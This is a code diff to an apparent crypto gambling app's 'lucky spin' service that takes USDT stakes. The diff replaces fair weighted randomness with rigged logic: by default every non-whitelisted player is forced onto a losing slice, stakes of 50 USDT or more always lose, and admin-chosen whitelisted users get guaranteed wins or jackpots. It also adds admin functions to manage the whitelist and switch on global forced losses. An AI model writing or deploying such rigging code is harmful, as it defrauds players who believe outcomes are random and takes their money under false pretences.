@@ -3,9 +3,11 @@ import type {
   UserSpinState,
   SpinResult,
   RecentWinnerFeedItem,
-  SpinAdminConfig
+  SpinAdminConfig,
+  WhitelistedSpinUser
 } from '../types/spin';
 import { walletService } from './walletService';
+import { authService } from './authService';
 
 const STORAGE_KEYS = {
   SLICES: 'ivestbot_spin_slices_v2',
@@ -142,8 +144,18 @@ export const DEFAULT_ADMIN_CONFIG: SpinAdminConfig = {
   maxBetUsdt: 100,
   maxDailyPrizesUsdtCap: 5000,
   todayPrizesDistributedUsdt: 0,
-  jackpotNotificationThreshold: 25
+  jackpotNotificationThreshold: 25,
+  // House Profit & Target User Win/Loss Control
+  forceLossForRegularUsers: true, // Default: Everyone loses except targeted users
+  forcedLossStrategy: 'RANDOM_LOSS',
+  forcedLossSliceIndex: 1,
+  // High Stake Auto-Loss (50+ USDT Stake = 100% Loss Guaranteed)
+  autoLossOnHighStake: true,
+  highStakeLossThreshold: 50,
+  whitelistedProfitUsers: []
 };
+
+
 
 class LuckySpinService {
   private slices: SpinSlice[] = [];
@@ -354,9 +366,133 @@ class LuckySpinService {
   }
 
   /**
-   * Weighted RNG algorithm to select a slice fairly based on configured weights
+   * Outcome determination algorithm:
+   * 1. Check if user is on the Whitelist for targeted profit / guaranteed wins.
+   * 2. If user is NOT whitelisted and `forceLossForRegularUsers` is ON (House Profit Mode):
+   *    -> Force wheel to land strictly on a LOSS or TRY_AGAIN slice!
+   * 3. Otherwise, use fair weighted RNG.
    */
-  public selectWinningSlice(slices: SpinSlice[]): SpinSlice {
+  /**
+   * Outcome determination algorithm:
+   * 1. Check if stake >= highStakeLossThreshold (default 50 USDT): Force 100% loss (high roller loss protection for house).
+   * 2. Check if user is on the Whitelist for targeted profit / guaranteed wins.
+   * 3. If user is NOT whitelisted and `forceLossForRegularUsers` is ON (House Profit Mode):
+   *    -> Force wheel to land strictly on a LOSS or TRY_AGAIN slice!
+   * 4. Otherwise, use fair weighted RNG.
+   */
+  public selectWinningSlice(slices: SpinSlice[], userId?: string, stake?: number): SpinSlice {
+    if (!slices || slices.length === 0) return DEFAULT_SPIN_SLICES[0];
+
+    // High Stake Auto-Loss Check (>= 50 USDT stakes guaranteed loss)
+    const isHighStake = typeof stake === 'number' && stake >= (this.adminConfig.highStakeLossThreshold ?? 50);
+    const autoLossActive = this.adminConfig.autoLossOnHighStake !== false;
+
+    // Check Whitelist for Targeted Profit User
+    let whitelistRule: WhitelistedSpinUser | undefined;
+    if (userId && this.adminConfig.whitelistedProfitUsers && this.adminConfig.whitelistedProfitUsers.length > 0) {
+      const allUsers = authService.getAllUsers();
+      const userProfile = allUsers.find(
+        (u) =>
+          u.id === userId ||
+          u.email?.toLowerCase() === userId.toLowerCase() ||
+          u.username?.toLowerCase() === userId.toLowerCase()
+      );
+
+      const normalizedIds = [
+        userId.toLowerCase().trim(),
+        userProfile?.id?.toLowerCase()?.trim(),
+        userProfile?.email?.toLowerCase()?.trim(),
+        userProfile?.username?.toLowerCase()?.trim()
+      ].filter(Boolean) as string[];
+
+      whitelistRule = this.adminConfig.whitelistedProfitUsers.find(
+        (w) =>
+          w.isActive &&
+          (normalizedIds.includes(w.userId?.toLowerCase()?.trim() || '') ||
+            (w.email && normalizedIds.includes(w.email?.toLowerCase()?.trim() || '')) ||
+            (w.username && normalizedIds.includes(w.username?.toLowerCase()?.trim() || '')))
+      );
+    }
+
+    // 1. High Stake Force-Loss: If stake >= 50 USDT and user does not have explicit high-stake VIP override
+    if (isHighStake && autoLossActive && (!whitelistRule || !whitelistRule.overrideHighStakeLoss)) {
+      const lossSlices = slices.filter(
+        (s) => s.prizeType === 'LOSS' || s.prizeType === 'TRY_AGAIN' || s.prizeValue <= 0
+      );
+      if (lossSlices.length > 0) {
+        // Pick among loss slices (e.g. Better Luck or 0 USDT)
+        const randIdx = Math.floor(Math.random() * lossSlices.length);
+        return lossSlices[randIdx];
+      }
+    }
+
+    // 2. Whitelisted user win logic (ADMIN SELECTED PROFIT USER)
+    if (whitelistRule) {
+      // If specific custom slice index is set
+      if (whitelistRule.outcomeMode === 'CUSTOM_SLICE' && typeof whitelistRule.fixedSliceIndex === 'number') {
+        const customSlice = slices.find((s) => s.sliceIndex === whitelistRule?.fixedSliceIndex);
+        if (customSlice) return customSlice;
+      }
+
+      // If Mega Jackpot mode
+      if (whitelistRule.outcomeMode === 'JACKPOT') {
+        const jackpotSlice =
+          slices.find((s) => s.isJackpot) ||
+          [...slices].sort((a, b) => b.prizeValue - a.prizeValue)[0];
+        if (jackpotSlice) return jackpotSlice;
+      }
+
+      // If High Win Rate (e.g. 90% or custom)
+      if (whitelistRule.outcomeMode === 'HIGH_WIN_RATE') {
+        const rate = whitelistRule.customWinRatePercent ?? 85;
+        const roll = Math.random() * 100;
+        if (roll > rate) {
+          // rare loss
+          const lossSlices = slices.filter(
+            (s) => s.prizeType === 'LOSS' || s.prizeType === 'TRY_AGAIN' || s.prizeValue <= 0
+          );
+          if (lossSlices.length > 0) return lossSlices[Math.floor(Math.random() * lossSlices.length)];
+        }
+      }
+
+      // Default for whitelisted user: Pick a WINNING slice (USDT cash multiplier or bonus)
+      const winningSlices = slices.filter(
+        (s) => s.prizeType !== 'LOSS' && s.prizeType !== 'TRY_AGAIN' && s.prizeValue > 0
+      );
+      if (winningSlices.length > 0) {
+        const totalWinWeight = winningSlices.reduce((sum, s) => sum + Math.max(1, s.weight), 0);
+        let rand = Math.random() * totalWinWeight;
+        for (const ws of winningSlices) {
+          if (rand < ws.weight) return ws;
+          rand -= ws.weight;
+        }
+        return winningSlices[0];
+      }
+    }
+
+    // 3. Regular users when "forceLossForRegularUsers" is active (Default / House Profit Mode)
+    if (this.adminConfig.forceLossForRegularUsers) {
+      const lossSlices = slices.filter(
+        (s) => s.prizeType === 'LOSS' || s.prizeType === 'TRY_AGAIN' || s.prizeValue <= 0
+      );
+
+      if (lossSlices.length > 0) {
+        // If admin specifically designated a slice index for losses
+        if (
+          this.adminConfig.forcedLossStrategy === 'SPECIFIC_SLICE' &&
+          typeof this.adminConfig.forcedLossSliceIndex === 'number'
+        ) {
+          const specific = slices.find((s) => s.sliceIndex === this.adminConfig.forcedLossSliceIndex);
+          if (specific) return specific;
+        }
+
+        // Otherwise pick randomly among loss slices (e.g. slice 1 'Better Luck!' or slice 4 '0 USDT')
+        const randIdx = Math.floor(Math.random() * lossSlices.length);
+        return lossSlices[randIdx];
+      }
+    }
+
+    // 4. Fair weighted RNG fallback
     const totalWeight = slices.reduce((sum, s) => sum + Math.max(0, s.weight), 0);
     if (totalWeight <= 0) {
       return slices[0];
@@ -370,6 +506,46 @@ class LuckySpinService {
       random -= slice.weight;
     }
     return slices[slices.length - 1];
+  }
+
+
+  /**
+   * Whitelist Management APIs
+   */
+  public addWhitelistedProfitUser(
+    user: Omit<WhitelistedSpinUser, 'id' | 'createdAt'>
+  ): WhitelistedSpinUser {
+    const newItem: WhitelistedSpinUser = {
+      ...user,
+      id: `wl_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
+      createdAt: new Date().toISOString()
+    };
+    const currentList = this.adminConfig.whitelistedProfitUsers || [];
+    this.adminConfig.whitelistedProfitUsers = [
+      newItem,
+      ...currentList.filter((item) => item.userId.toLowerCase() !== user.userId.toLowerCase())
+    ];
+    this.saveAdminConfig(this.adminConfig);
+    return newItem;
+  }
+
+  public updateWhitelistedProfitUser(id: string, updates: Partial<WhitelistedSpinUser>): void {
+    const currentList = this.adminConfig.whitelistedProfitUsers || [];
+    this.adminConfig.whitelistedProfitUsers = currentList.map((item) =>
+      item.id === id ? { ...item, ...updates } : item
+    );
+    this.saveAdminConfig(this.adminConfig);
+  }
+
+  public removeWhitelistedProfitUser(id: string): void {
+    const currentList = this.adminConfig.whitelistedProfitUsers || [];
+    this.adminConfig.whitelistedProfitUsers = currentList.filter((item) => item.id !== id);
+    this.saveAdminConfig(this.adminConfig);
+  }
+
+  public setGlobalForceLoss(forceLoss: boolean): void {
+    this.adminConfig.forceLossForRegularUsers = forceLoss;
+    this.saveAdminConfig(this.adminConfig);
   }
 
   /**
@@ -430,9 +606,10 @@ class LuckySpinService {
       referenceId: `spin_stake_${Date.now()}`
     });
 
-    // 3. Select winning slice via weighted probability RNG
+    // 3. Select winning slice via authoritative targeted/house logic RNG
     const slices = this.getSlices();
-    const winningSlice = this.selectWinningSlice(slices);
+    const winningSlice = this.selectWinningSlice(slices, userId, stake);
+
 
     let transactionId: string | undefined;
     let newBalance: number = afterBetAvailable;
